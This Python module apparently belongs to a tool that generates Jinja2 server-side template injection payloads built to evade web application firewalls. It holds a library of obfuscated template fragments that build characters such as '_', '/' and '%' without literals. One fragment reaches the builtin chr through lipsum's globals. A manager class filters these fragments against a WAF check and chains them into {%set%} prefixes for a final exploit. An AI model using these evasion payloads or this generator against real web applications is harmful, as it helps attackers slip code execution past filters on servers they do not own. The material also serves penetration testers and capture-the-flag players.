"""提供上下文的payload, 为最终的payload提供一系列变量

"""

from typing import Iterable, Dict, Any, Callable, Union
import logging
import random
import string
import re
from .const import WafFunc, PythonEnvironment, SET_STMT_PATTERNS
from .options import Options

logger = logging.getLogger("context_vars")

# 所有的上下文payload, 存储格式为: {payload: {变量名：变量值}}

Context = Dict[str, Any]
ContextPayloads = Dict[str, Context]
Waf = Callable[[str], bool]

# 所有上下文的payload, 变量名不能重复
# 注意这里的payload需要兼容python2/3

context_payloads_stmts: ContextPayloads = {
    "{%set oa={}|int%}{%set la=oa**oa%}{%set lla=(la~la)|int%}"
    + "{%set llla=(lla~la)|int%}{%set lllla=(llla~la)|int%}": {
        "oa": 0,
        "la": 1,
        "lla": 11,
        "llla": 111,
        "lllla": 1111,
    },
    "{%set ob={}|int%}{%set lb=ob**ob%}{%set llb=(lb~lb)|int%}"
    + "{%set lllb=(llb~lb)|int%}{%set llllb=(lllb~lb)|int%}"
    + "{%set bb=llb-lb-lb-lb-lb-lb%}{%set sbb=lllb-llb-llb-llb-llb-llb%}"
    + "{%set ssbb=llllb-lllb-lllb-lllb-lllb-lllb%}"
    + "{%set zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%}": {
        "ob": 0,
        "lb": 1,
        "llb": 11,
        "lllb": 111,
        "llllb": 1111,
        "bb": 6,
        "sbb": 56,
        "ssbb": 556,
        "zzeb": 223,
    },
}

context_payloads_stmts_py3 = {
    (
        "{%set ndr={}|select()|trim|list|batch(25)|first|last%}{%set sls=1|attr"
        + "((ndr,ndr,dict(truediv=x)|join,ndr,ndr)|join)|attr"
        + "((ndr,ndr,dict(doc=x)|join,ndr,ndr)|join)|batch(12)|first|last%}"
    ): {
        "ndr": "_",
        "sls": "/",
    },
}

context_payloads_exprs = {
    "lipsum()|urlencode|first": "%",
    "lipsum|escape|batch(22)|first|last": "_",
    "dict(x=x)|length": 1,
    "dict(x=x)|count": 1,
    "dict(a=x,b=x,c=x)|length": 3,
    "dict(a=x,b=x,c=x)|count": 3,
    "dict(aaaaa=x)|first|length": 5,
    "dict(aaaaa=x)|first|count": 5,
    "lipsum.__doc__|length": 43,
    "namespace.__doc__|length": 126,
    "joiner|urlencode|wordcount": 7,
    "namespace|escape|count": 46,
    "cycler|escape|urlencode|count": 65,
    "namespace|escape|urlencode|escape|urlencode|count": 90,
    (
        "cycler|escape|urlencode|escape|urlenc"
        + "ode|escape|urlencode|escape|urlencode|count"
    ): 131,
    "lipsum|escape|urlencode|list|escape|urlencode|count": 2015,
}

context_payloads_exprs_py3 = {
    "1.__mod__.__doc__.__getitem__(11)": "%",
    (
        "({0:1}|safe).replace((1|safe).rjust(2),"
        + "cycler.__name__|batch(3)|first|last).format(((9,9,9,1,9)|sum))"
    ): "%",
    (
        "(lipsum[((({}|select()|trim|list)[24]))*2+"
        + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
        + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
        + ")[24]))*2][dict(chr=x)|join](37))"
    ): "%",
    "({}|select()|trim|list)[24]": "_",
    "{}|select()|trim|list|batch(25)|first|last": "_",
    "{}|select()|trim|list|attr(dict(po=x,p=x)|join)(24)": "_",
    "{}|escape|first|count": 1,
    "{}|escape|urlencode|count": 6,
    "{}|escape|list|escape|count": 26,
    "{}|escape|urlencode|list|escape|urlencode|count": 178,
}

digit_looks_similiar = {
    "0": "o",
    "1": "i",
    "2": "z",
    "3": "e",
    "4": "a",
    "5": "s",
    "6": "b",
    "7": "t",
    "8": "x",
    "9": "q",
}


def digit_to_similiar_alpha(s: str) -> str:
    """将字符串中的数字转换为形状类似的字母

    Args:
        s (str): 需要转换的字符串

    Returns:
        str: 转化结果
    """
    for d, c in digit_looks_similiar.items():
        s = s.replace(d, c)
    return s


def filter_by_waf(
    context_payloads: ContextPayloads, waf: Callable[[str], bool]
) -> ContextPayloads:
    """根据WAF函数去除所有不能通过WAF的payload

    Args:
        context_payloads (ContextPayloads): 需要过滤的ContextPayload
        waf (Callable[[str], bool]): WAF函数，

    Returns:
        ContextPayloads: 过滤后的ContextPayload
    """
    return {payload: d for payload, d in context_payloads.items() if waf(payload)}


def filter_by_used_context(
    context_payloads: ContextPayloads, used_context: Iterable
) -> ContextPayloads:
    """根据已经使用的变量列表过滤上下文payload

    Args:
        context_payloads (ContextPayloads): 需要过滤的ContextPayload
        used_context (Iterable): 使用的变量名

    Returns:
        ContextPayloads: 过滤后的ContextPayloads
    """
    return {
        payload: d
        for payload, d in context_payloads.items()
        if any(var_name in used_context for var_name in d.keys())
    }


class ContextVariableManager:
    """管理上下文变量payload的工具类
    这个类管理类似{%set xxx%}的payload以及其对应的变量名与值
    """

    def __init__(self, waf: WafFunc, context_payloads: ContextPayloads):
        self.waf = waf
        self.context_payloads = context_payloads.copy()
        self.payload_dependency = {}
        self.prepared = False

    def do_prepare(self):
        """准备函数，会被自动调用"""
        if self.prepared:
            return
        self.context_payloads = filter_by_waf(self.context_payloads, self.waf)
        self.prepared = True

    def is_variable_exists(self, var_name: str) -> bool:
        """返回变量是否存在

        Args:
            var_name (str): 变量名

        Returns:
            bool: 是否存在
        """
        all_vars = set(v for d in self.context_payloads.values() for v in d)
        return var_name in all_vars

    def generate_related_variable_name(self, value: Any) -> Union[str, None]:
        """生成一个和value相关的变量名，如globals => gl或go，用于提升最终payload的可读性

        Args:
            value (str): 和变量名相关的字符串

        Returns:
            Union[str, None]: 结果
        """
        value = "".join(re.findall("[a-zA-Z0-9]+", repr(value))).lower()
        value = digit_to_similiar_alpha(value)
        if len(value) < 2:
            return None
        for c in value[1:]:
            var_name = value[0] + c
            if self.is_variable_exists(var_name):
                continue
            if not self.waf(var_name):
                continue
            return var_name
        return None

    def generate_random_variable_name(self) -> Union[str, None]:
        """生成一个可能的变量名

        Returns:
            Union[str, None]: 可能的变量名，失败时返回None
        """
        var_name = None

        for i in range(20):
            # 变量名的长度由尝试次数决定
            var_length = 2 if i < 10 else 3
            name = "".join(random.choices(string.ascii_lowercase, k=var_length))
            if self.is_variable_exists(name):
                continue
            if not self.waf(name):
                continue
            var_name = name
            break
        return var_name

    def add_payload(
        self,
        payload: str,
        variables: Context,
        depends_on: Union[Context, None] = None,
        check_waf: bool = True,
    ) -> bool:
        """将payload加入context payloads中

        Args:
            payload (str): 需要加入的payload
            variables (Context): payload中存储的一系列变量，不能和已有的重复
            depends_on (Union[Context, None], optional): payload依赖的变量. Defaults to None.
            check_waf (bool, optional): 是否使用waf函数检查payload是否合法. Defaults to True.

        Returns:
            bool: 是否加入成功
        """
        if not self.prepared:
            self.do_prepare()
        if check_waf and not self.waf(payload):
            return False
        if any(self.is_variable_exists(v) for v in variables):
            return False
        if depends_on is not None:
            if not all(self.is_variable_exists(v) for v in depends_on):
                notfound_vars = [
                    v for v in depends_on if not self.is_variable_exists(v)
                ]
                logger.warning("Variables not found: %s", repr(notfound_vars))
                return False
            self.payload_dependency[payload] = depends_on
        self.context_payloads[payload] = variables
        return True

    def get_payload(self, used_context: Context) -> str:
        """根据使用了的变量生成对应的payload

        Args:
            used_context (Context): 使用了的变量

        Raises:
            RuntimeError: 输入变量依赖了不存在的变量

        Returns:
            str: 包含对应变量的payload
        """
        if not self.prepared:
            self.do_prepare()
        answer = ""
        to_add_vars = list(used_context.keys())
        added_vars = set()
        while to_add_vars:
            to_add = to_add_vars.pop(0)

            if to_add in added_vars:
                continue
            if not self.is_variable_exists(to_add):
                raise RuntimeError(f"Variable {to_add} not found")

            payload = next(
                payload for payload, d in self.context_payloads.items() if to_add in d
            )
            if payload in self.payload_dependency:
                # 检测依赖的变量是否都加入了
                vars_name = list(self.payload_dependency[payload].keys())
                assert all(self.is_variable_exists(v) for v in vars_name)
                if not all(v in added_vars for v in vars_name):
                    to_add_vars += list(self.payload_dependency[payload])
                    to_add_vars.append(to_add)
                    continue

            answer += payload
            added_vars.add(to_add)
        return answer

    def get_context(self) -> Context:
        """输出当前包含的变量

        Returns:
            Context: 所有包含的payload
        """
        return {
            var_name: var_value
            for _, d in self.context_payloads.items()
            for var_name, var_value in d.items()
        }


def get_context_vars_manager(waf: WafFunc, options: Options) -> ContextVariableManager:
    """根据waf函数和对应选项生成ContextVariableManager

    Args:
        waf (WafFunc): 对应的waf函数
        options (Options): 对应的选项

    Returns:
        ContextVariableManager: 生成的实例
    """
    context_payloads = context_payloads_stmts.copy()
    if options.python_version == PythonEnvironment.PYTHON3:
        context_payloads.update(context_payloads_stmts_py3)
    manager = ContextVariableManager(waf, context_payloads)
    manager.do_prepare()

    set_stmt_pattern = None  # sth like "{%set NAME=EXPR%}"
    for pattern, test_pattern in SET_STMT_PATTERNS:
        if waf(test_pattern):
            set_stmt_pattern = pattern
            break

    if not set_stmt_pattern:
        return manager

    exprs = context_payloads_exprs.copy()
    if options.python_version == PythonEnvironment.PYTHON3:
        exprs.update(context_payloads_exprs_py3)
    for expr, value in exprs.items():
        if not waf(expr):
            continue
        name = manager.generate_random_variable_name()
        if not name:
            continue
        stmt = set_stmt_pattern.replace("NAME", name).replace("EXPR", expr)
        _ = manager.add_payload(stmt, {name: value})

    return manager
